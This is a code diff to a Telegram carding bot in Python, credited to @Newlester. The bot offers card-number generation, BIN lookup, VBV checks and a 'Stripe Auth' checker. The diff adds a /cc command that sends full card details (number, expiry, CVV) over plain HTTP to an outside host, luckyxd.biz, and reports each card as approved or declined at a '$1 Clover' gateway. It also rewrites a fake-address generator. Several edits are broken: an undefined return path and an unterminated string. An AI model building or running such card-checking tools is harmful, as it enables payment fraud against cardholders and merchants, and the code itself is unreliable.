@@ -185,92 +185,46 @@ def gen_command(message):
 
     threading.Thread(target=run_async).start()
 
-    async def generate_fake_address(country_code):
+    
+
+async def generate_fake_address(country_code):
+    url = f"https://randomuser.me/api/?nat={country_code}"
     async with aiohttp.ClientSession() as session:
-        # Try randomuser.me first
-        try:
-            url1 = "https://randomuser.me/api/"
-            async with session.get(url1, timeout=10) as response:
-                if response.status == 200:
-                    data = await response.json()
-                    result = data['results'][0]
+        async with session.get(url, timeout=10) as response:
+            if response.status != 200:
+                raise Exception("Failed to fetch fake address.")
+            data = await response.json()
+            result = data['results'][0]
 
-                    full_name = f"{result['name']['first']} {result['name']['last']}"
-                    street = result['location']['street']
-                    street_address = f"{street['number']} {street['name']}"
-                    city = result['location']['city']
-                    state = result['location']['state']
-                    postal_code = result['location']['postcode']
-                    phone_number = result['phone']
-                    country = result['location']['country']
+            full_name = f"{result['name']['first']} {result['name']['last']}"
+            street = result['location']['street']
+            street_address = f"{street['number']} {street['name']}"
+            city = result['location']['city']
+            state = result['location']['state']
+            postal_code = result['location']['postcode']
+            phone_number = result['phone']
+            country = result['location']['country']
 
-                    return {
-                        "full_name": full_name,
-                        "street_address": street_address,
-                        "city": city,
-                        "state": state,
-                        "postal_code": postal_code,
-                        "phone_number": phone_number,
-                        "country": country
-                    }
+            return {
+                "full_name": full_name,
+                "street_address": street_address,
+                "city": city,
+                "state": state,
+                "postal_code": postal_code,
+                "phone_number": phone_number,
+                "country": country
+            }
 
-        except Exception as e:
-            print(f"randomuser.me failed: {e}")
 
-        #async def generate_fake_address(country_code):
-    async with aiohttp.ClientSession() as session:
-        # Try randomuser.me first
-        try:
-            url1 = "https://randomuser.me/api/"
-            async with session.get(url1, timeout=10) as response:
-                if response.status == 200:
-                    data = await response.json()
-                    result = data['results'][0]
-
-                    full_name = f"{result['name']['first']} {result['name']['last']}"
-                    street = result['location']['street']
-                    street_address = f"{street['number']} {street['name']}"
-                    city = result['location']['city']
-                    state = result['location']['state']
-                    postal_code = result['location']['postcode']
-                    phone_number = result['phone']
-                    country = result['location']['country']
-
-                    return {
-                        "full_name": full_name,
-                        "street_address": street_address,
-                        "city": city,
-                        "state": state,
-                        "postal_code": postal_code,
-                        "phone_number": phone_number,
-                        "country": country
-                    }
-
-        except Exception as e:
-            print(f"randomuser.me failed: {e}")
-
-        # Fallback to fakerapi.it
-        try:
-            url2 = "https://fakerapi.it/api/v1/persons?_locale=en_US&_quantity=1"
-            async with session.get(url2, timeout=10) as response:
-                if response.status != 200:
-                    raise Exception(f"Fallback also failed. Status: {response.status}")
-
-                data = await response.json()
-                result = data['data'][0]
-
-                return {
-                    "full_name": f"{result['firstname']} {result['lastname']}",
-                    "street_address": result['address'],
-                    "city": result['city'],
-                    "state": result['state'],
-                    "postal_code": result['zipcode'],
-                    "phone_number": result['phone'],
-                    "country": "United States"
-                }
-
-        except Exception as e:
-            return {"error": f"Both APIs failed: {e}"}
+    return {
+        "full_name": f"{first_name} {last_name}",
+        "street_address": street_address,
+        "city": city,
+        "state": state,
+        "postal_code": postal_code,
+        "phone_number": phone_number,
+        "country": country
+    }
 
 @bot.message_handler(func=lambda message: message.text.startswith(("/fake", ".fake")))
 def fake_command(message):
@@ -347,6 +301,60 @@ def get_country_name_and_flag(country_code):
         return "Unknown", "🏳️"
 
 import time
+
+@bot.message_handler(func=lambda message: message.text.startswith(("/cc", ".cc")))
+def cc_command(message):
+    import threading
+
+    def run_async():
+        async def check_clover():
+            try:
+                parts = message.text.split()
+                if len(parts) < 2:
+                    bot.reply_to(message, "❌ PLEASE PROVIDE A CARD.")
+                    return
+
+                cc = parts[1].strip()
+                bin_number = cc.split('|')[0][:6]
+                start_time = time.time()
+
+                waiting = bot.reply_to(message, "⏳ Please wait...")
+
+                async with aiohttp.ClientSession() as session:
+                    async with session.get(f"http://luckyxd.biz:1111/clv?cc={cc}", timeout=20) as response:
+                        json_data = await response.json()
+                        result_text = json_data.get("result", "No result")
+                
+                bin_info = await lookup_bin(bin_number)
+                elapsed = round(time.time() - start_time, 2)
+
+                info = f"{bin_info.get('network', 'N/A')} - {bin_info.get('card_type', 'N/A')} - {bin_info.get('tier', 'N/A')}"
+                issuer = bin_info.get("bank", "N/A")
+                country = bin_info.get("country", "N/A")
+                flag = bin_info.get("flag", "🏳️")
+
+                verdict = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if "success" in result_text.lower() or "charged" in result_text.lower() or "approved" in result_text.lower() else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
+
+                response_msg = (
+                    f"{verdict}\n\n"
+                    f"𝗖𝗮𝗿𝗱: <code>{cc}</code>\n"
+                    f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Clover 1$\n"
+                    f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {result_text}\n\n"
+                    f"𝗜𝗻𝗳𝗼: {info}\n"
+                    f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
+                    f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {flag}\n\n"
+                    f"𝗧𝗶𝗺𝗲: {elapsed} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
+                )
+
+                bot.edit_message_text(response_msg, chat_id=message.chat.id, message_id=waiting.message_id, parse_mode="HTML")
+
+            except Exception as e:
+                bot.reply_to(message, f"❌ ERROR: {e}")
+
+        asyncio.run(check_clover())
+
+    threading.Thread(target=run_async).start()
+
 
 @bot.message_handler(func=lambda message: message.text.startswith(("/vbv", ".vbv")))
 def vbv_command(message):
@@ -492,7 +500,7 @@ def start_command(message):
         "/bin :- 𝐁𝐢𝐧 𝐋𝐨𝐨𝐤𝐮𝐩\n"
         "/gen :- 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐂𝐂\n"
         "/vbv :- 𝐒𝐢𝐧𝐠𝐥𝐞 𝐕𝐁𝐕\n"
-
+        "/cc :- 𝐂𝐥𝐨𝐯𝐞𝐫 1$
         "/chk :- 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡\n\n"
         "Bᴏᴛ Bʏ @Newlester "
     )
